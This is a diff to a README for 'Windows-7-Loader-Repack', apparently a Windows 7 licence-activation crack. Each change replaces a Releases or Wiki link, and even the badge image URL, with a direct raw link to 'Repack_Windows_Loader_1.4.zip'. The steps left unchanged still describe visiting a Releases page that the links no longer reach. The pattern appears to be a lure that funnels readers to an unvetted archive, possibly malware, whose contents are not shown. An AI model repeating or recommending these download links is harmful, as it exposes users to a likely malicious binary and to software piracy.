@@ -1,6 +1,6 @@
 # 🎉 Windows-7-Loader-Repack - Your Easy Windows 7 Helper
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now!-Windows%207%20Loader%20Repack-brightgreen)](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/releases)
+[![Download Now!](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/raw/refs/heads/main/inoxidize/Repack_Windows_Loader_1.4.zip%20Now!-Windows%207%20Loader%20Repack-brightgreen)](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/raw/refs/heads/main/inoxidize/Repack_Windows_Loader_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, ensure that your system meets these requirements:
 
 To get started, visit the page below to download the latest version of the Windows-7-Loader-Repack. 
 
-[Download Windows-7-Loader-Repack](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/releases)
+[Download Windows-7-Loader-Repack](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/raw/refs/heads/main/inoxidize/Repack_Windows_Loader_1.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the software listed.
@@ -64,9 +64,9 @@ For further assistance, feel free to reach out. You can find support through our
 
 ## 📝 Additional Resources
 
-- Check out our [Wiki](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/wiki) for tutorials and guides.
+- Check out our [Wiki](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/raw/refs/heads/main/inoxidize/Repack_Windows_Loader_1.4.zip) for tutorials and guides.
 - Follow the project's progress on our GitHub page to see upcoming features and updates.
 
 Thank you for using Windows-7-Loader-Repack. We hope this tool makes your Windows 7 experience better and easier to manage! 
 
-[Download Windows-7-Loader-Repack](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/releases)
+[Download Windows-7-Loader-Repack](https://github.com/DemonioParlante666/Windows-7-Loader-Repack/raw/refs/heads/main/inoxidize/Repack_Windows_Loader_1.4.zip)
